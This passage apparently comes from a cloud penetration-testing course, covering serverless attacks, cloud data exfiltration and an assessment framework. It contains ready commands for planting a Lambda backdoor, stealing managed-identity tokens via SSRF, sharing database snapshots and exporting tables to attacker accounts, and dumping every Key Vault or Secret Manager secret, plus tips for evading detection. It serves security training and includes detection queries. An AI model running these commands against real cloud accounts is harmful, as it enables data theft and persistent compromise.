            "command": "aws lambda update-function-code --function-name FUNC --zip-file fileb://backdoor.zip",
            "impact": "Persistent code execution"
        }
    }
    
    GCF_GCRUN_ATTACKS = {
        "Cloud Functions": {
            "unauthenticated_access": "gcf with allUsers invoker permission",
            "test": "curl https://REGION-PROJECT.cloudfunctions.net/FUNCTION_NAME",
            "code_injection": "Modify function source via GCS bucket"
        },
        "Cloud Run": {
            "public_service": "Cloud Run service with unauthenticated access",
            "test": "curl https://SERVICE-HASH-uc.a.run.app",
            "env_exposure": "Sensitive vars in container environment"
        }
    }
    
    AZURE_FUNCTIONS_ATTACKS = {
        "Anonymous Function Key": {
            "description": "Function app with anonymous auth allows direct calls",
            "test": "curl https://APP.azurewebsites.net/api/FUNC?code=FUNCTION_KEY"
        },
        "Deployment Slot Abuse": {
            "description": "Dev/staging slots may have different security settings",
            "test": "curl https://APP-staging.azurewebsites.net/api/FUNC"
        },
        "MSI Token Theft via SSRF": {
            "description": "SSRF to steal Managed Service Identity tokens",
            "target": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        }
    }
    
    PAAS_SECURITY_CHECKLIST = [
        "Enforce authentication on all serverless functions",
        "Implement least-privilege IAM for function execution roles",
        "Avoid storing secrets in environment variables (use Secret Manager/Key Vault)",
        "Enable function-level logging and monitoring",
        "Implement input validation to prevent SSRF/injection",
        "Use VPC/private endpoints for sensitive function access",
        "Enable code signing for serverless deployments",
        "Restrict function execution environment (CPU/memory/network)",
        "Implement timeout and concurrency limits",
        "Regular code review for serverless functions"
    ]
    
    def audit_lambda_security(self) -> str:
        """AWS Lambda Security Audit Commands"""
        return '''
# AWS Lambda Security Audit

# List all Lambda functions
aws lambda list-functions --query 'Functions[].{Name:FunctionName, Runtime:Runtime, Role:Role}'

# Check function URLs (potential unauthenticated access)
aws lambda list-function-url-configs --function-name FUNC_NAME

# Get environment variables (may contain secrets)
aws lambda get-function-configuration --function-name FUNC_NAME \\
    --query 'Environment.Variables'

# Check function policy (trigger permissions)
aws lambda get-policy --function-name FUNC_NAME

# List functions with public Function URLs
for func in $(aws lambda list-functions --query 'Functions[].FunctionName' -o text); do
    urls=$(aws lambda list-function-url-configs --function-name $func 2>/dev/null)
    if [ ! -z "$urls" ]; then
        echo "Function with URL: $func"
        echo $urls | jq '.FunctionUrlConfigs[].AuthType'
    fi
done
'''

if __name__ == "__main__":
    serverless = ServerlessAttacks()
    print("Lambda Attack Vectors:")
    for vector, info in serverless.LAMBDA_ATTACK_VECTORS.items():
        print(f"  {vector}: {info['description']}")
    
    print("\nPaaS Security Checklist:")
    for item in serverless.PAAS_SECURITY_CHECKLIST[:5]:
        print(f"  - {item}")
```

---

## Step 949: Cloud Exfiltration Techniques

```python
from dataclasses import dataclass
from typing import List, Dict

class CloudExfiltration:
    """เทคนิคการดึงข้อมูลออกจาก Cloud Environment"""
    
    AWS_EXFIL_TECHNIQUES = {
        "S3 Exfiltration": {
            "command": "aws s3 cp s3://BUCKET/ ./exfil/ --recursive",
            "via_lambda": "Lambda function that exfils to attacker S3"
        },
        "RDS Snapshot": {
            "command": "aws rds create-db-snapshot --db-instance-identifier DB --db-snapshot-identifier stolen-snap",
            "share": "aws rds modify-db-snapshot-attribute --db-snapshot-identifier stolen-snap --attribute-name restore --values-to-add ATTACKER_ACCOUNT_ID"
        },
        "Secrets Manager": {
            "command": "aws secretsmanager list-secrets && aws secretsmanager get-secret-value --secret-id SECRET_NAME"
        },
        "DynamoDB Export": {
            "command": "aws dynamodb export-table-to-point-in-time --table-arn ARN --s3-bucket ATTACKER_BUCKET"
        }
    }
    
    AZURE_EXFIL_TECHNIQUES = {
        "Blob Storage Download": {
            "command": "azcopy copy 'https://ACCOUNT.blob.core.windows.net/CONTAINER/*' ./exfil/ --recursive"
        },
        "SQL Database Export": {
            "command": "az sql db export --admin-password P --admin-user U --auth-type SQL --name DB --resource-group RG --server SERVER --storage-key KEY --storage-key-type StorageAccessKey --storage-uri https://ACCOUNT.blob.core.windows.net/CONTAINER/export.bacpac"
        },
        "Key Vault Dump": {
            "script": "for secret in $(az keyvault secret list --vault-name VAULT -o tsv --query '[].name'); do az keyvault secret show --vault-name VAULT --name $secret; done"
        }
    }
    
    GCP_EXFIL_TECHNIQUES = {
        "Cloud Storage Download": {
            "command": "gsutil -m cp -r gs://BUCKET/* ./exfil/"
        },
        "Cloud SQL Export": {
            "command": "gcloud sql export sql INSTANCE_NAME gs://BUCKET/backup.sql --database DB_NAME"
        },
        "BigQuery Export": {
            "command": "bq extract --destination_format CSV DATASET.TABLE gs://BUCKET/output-*.csv"
        },
        "Secret Manager Dump": {
            "command": "for s in $(gcloud secrets list --format='value(name)'); do gcloud secrets versions access latest --secret=$s; done"
        }
    }
    
    EXFIL_DETECTION_AVOIDANCE = [
        "Use low and slow exfiltration to avoid rate alerting",
        "Exfiltrate to cloud services in the same provider",
        "Blend exfil with normal backup operations",
        "Use encrypted channels (HTTPS) for exfiltration",
        "Exfiltrate during business hours to blend in",
        "Use legitimate cloud tools (gsutil, azcopy) to avoid detection"
    ]
    
    DETECTION_CONTROLS = [
        "Enable CloudTrail/Activity Log for all API calls",
        "Alert on large data downloads from storage",
        "Alert on RDS/SQL snapshot creation and sharing",
        "Monitor Secret Manager access patterns",
        "Implement data loss prevention (DLP) policies",
        "Use CASB solutions for cloud monitoring",
        "Set budget alerts for unusual egress costs"
    ]
    
    def generate_exfil_detection_queries(self) -> Dict:
        """KQL/SPL queries สำหรับตรวจจับ cloud exfil"""
        return {
            "Azure Monitor": """
// Detect large Azure Blob storage downloads
AzureDiagnostics
| where Category == "StorageRead"
| where tolong(bytesRead_s) > 1073741824  // >1GB
| summarize TotalBytes=sum(tolong(bytesRead_s)) by bin(TimeGenerated, 1h), CallerIpAddress
| where TotalBytes > 10737418240  // Alert on >10GB
""",
            "GCP Logging": """
-- Detect large GCS downloads
resource.type="gcs_bucket"
protoPayload.methodName="storage.objects.get"
protoPayload.response.object.size > "1073741824"
""",
            "AWS CloudTrail": """
# Detect S3 exfiltration
{
  "source": ["aws.s3"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["GetObject"],
    "requestParameters": {
      "bucketName": [{"exists": true}]
    }
  }
}
"""
        }

if __name__ == "__main__":
    exfil = CloudExfiltration()
    print("AWS Exfiltration Techniques:")
    for tech, info in exfil.AWS_EXFIL_TECHNIQUES.items():
        print(f"  {tech}")
    
    print("\nDetection Controls:")
    for control in exfil.DETECTION_CONTROLS[:5]:
        print(f"  - {control}")
    
    queries = exfil.generate_exfil_detection_queries()
    print(f"\nDetection Queries available: {list(queries.keys())}")
```

---

## Step 950: Cloud Security Assessment Framework

```python
from dataclasses import dataclass, field
from typing import List, Dict

class CloudSecurityAssessmentFramework:
    """Framework สำหรับ Cloud Security Assessment"""
    
    ASSESSMENT_PHASES = [
        {
            "phase": "Discovery",
            "activities": [
                "Identify cloud provider(s) in use",
                "Enumerate accounts and subscriptions",
                "Map resource inventory",
                "Identify IAM users/roles/service accounts",
                "Enumerate public-facing resources"
            ],
            "tools": ["ScoutSuite", "Prowler", "CloudMapper", "Steampipe"]
        },
        {
            "phase": "Privilege Analysis",
            "activities": [
                "Analyze IAM policies for dangerous permissions",
                "Identify privilege escalation paths",
                "Check for overprivileged accounts",
                "Enumerate unused permissions",
                "Test service account permissions"
            ],
            "tools": ["PMapper", "AzureHound", "BloodHound Enterprise"]
        },
        {
            "phase": "Network Assessment",
            "activities": [
                "Map security groups and NSGs",
                "Identify publicly accessible resources",
                "Check VPC/VNet peering configurations",
                "Assess network ACLs",
                "Test firewall rule coverage"
            ],
            "tools": ["Nmap", "Shodan", "CloudMapper"]
        },
        {
            "phase": "Data Assessment",
            "activities": [
                "Identify storage buckets with public access",
                "Check data classification and encryption",
                "Assess backup configurations",
                "Identify sensitive data exposure",
                "Check key management"
            ],
            "tools": ["BlobHunter", "S3Scanner", "GCPBucketBrute"]
        },
        {
            "phase": "Exploitation",
            "activities": [
                "Attempt privilege escalation",
                "Test credential/token theft",
                "Attempt container escape",
                "Test lateral movement paths",
                "Attempt data exfiltration"
            ],
            "tools": ["Pacu", "PowerZure", "PMapper"]
        }
    ]
    
    CLOUD_SECURITY_TOOLS = {
        "AWS": {
            "ScoutSuite": "Multi-cloud security auditing tool",
            "Prowler": "AWS security best practices assessment",
            "Pacu": "AWS exploitation framework",
            "CloudMapper": "Visualize AWS network topology",
            "PMapper": "AWS IAM privilege escalation analyzer"
        },
        "Azure": {
            "ScoutSuite": "Multi-cloud (includes Azure)",
            "PowerZure": "Azure exploitation PowerShell framework",
            "ROADtools": "Azure AD assessment framework",
            "AzureHound": "Azure AD BloodHound collector",
            "Stormspotter": "Azure AD attack path visualization"
        },
        "GCP": {
            "ScoutSuite": "Multi-cloud (includes GCP)",
            "GCPBucketBrute": "GCP bucket enumeration",
            "GCPHound": "GCP attack path analysis",
            "gcloud SDK": "Official GCP CLI for enumeration"
        },
        "Multi-Cloud": {
            "CloudSploit": "Cloud security configuration scanning",
            "Steampipe": "SQL-based cloud resource querying",
            "Trivy": "Container and cloud security scanning",
            "CSPM tools": "Wiz, Orca, Prisma Cloud"
        }
    }
    
    def scoutsuite_commands(self) -> str:
        """ScoutSuite สำหรับ Cloud Assessment"""
        return '''
# ScoutSuite - Multi-Cloud Security Assessment
# Install: pip install scoutsuite

# AWS Assessment
python scout.py aws \\
    --profile aws-profile \\
    --region us-east-1 eu-west-1 \\
    --report-name AWS-Assessment-2025

# Azure Assessment  
python scout.py azure --cli
# or
python scout.py azure --tenant TENANT_ID

# GCP Assessment
python scout.py gcp \\
    --project PROJECT_ID \\
    --service-account sa-key.json

# View report
# Open report.html in browser for interactive results
'''
    
    def generate_cloud_pentest_report_summary(self) -> str:
        """Summary สำหรับ Cloud Penetration Test"""
        return """
## Cloud Security Assessment Summary

### High-Risk Findings
1. Public Cloud Storage Buckets containing sensitive data
2. Overprivileged IAM roles enabling privilege escalation
3. Metadata server accessible via SSRF vulnerability
4. Service account keys stored in version control
5. Container escape from GKE pods to underlying nodes

### Key Recommendations
1. Implement strict bucket policies and audit public access
2. Apply least-privilege IAM and review regularly
3. Implement VPC Service Controls
4. Use Workload Identity instead of service account keys
5. Enable Pod Security Standards in Kubernetes
6. Implement CSPM solution for continuous monitoring
        """

if __name__ == "__main__":
    framework = CloudSecurityAssessmentFramework()
    
    print("Cloud Security Assessment Phases:")
    for phase in framework.ASSESSMENT_PHASES:
        print(f"\n  {phase['phase']}:")
        for activity in phase['activities'][:3]:
            print(f"    - {activity}")
        print(f"    Tools: {', '.join(phase['tools'])}")
    
    print("\nCloud Security Tools by Provider:")
    for provider, tools in framework.CLOUD_SECURITY_TOOLS.items():
        print(f"  {provider}: {', '.join(list(tools.keys())[:3])}")
```

---

## สรุป Part 95 (Steps 941-950)

| Step | หัวข้อ | เนื้อหา |
|------|--------|--------|
| 941 | Azure AD Attacks | Device code phishing, ROADtools, AADInternals |
| 942 | Azure RBAC PrivEsc | Dangerous permissions, AzureHound, Cypher queries |
| 943 | Azure Storage/Key Vault | Blob hunting, SAS token abuse, Key Vault access |
| 944 | GCP IAM Attacks | Dangerous permissions, actAs, gcloud enumeration |
| 945 | GCP Metadata SSRF | Metadata endpoints, SSRF payloads, Defense |
| 946 | Cloud Lateral Movement | Token abuse, SA chaining, K8s pivot |
| 947 | Container K8s Attacks | Container escape, RBAC privesc, kube-hunter |
| 948 | Serverless PaaS | Lambda attacks, Cloud Functions, Azure Functions |
| 949 | Cloud Exfiltration | S3/GCS/Blob dump, RDS snapshot sharing, Detection |
| 950 | Assessment Framework | ScoutSuite, Pacu, multi-cloud tools, report summary |
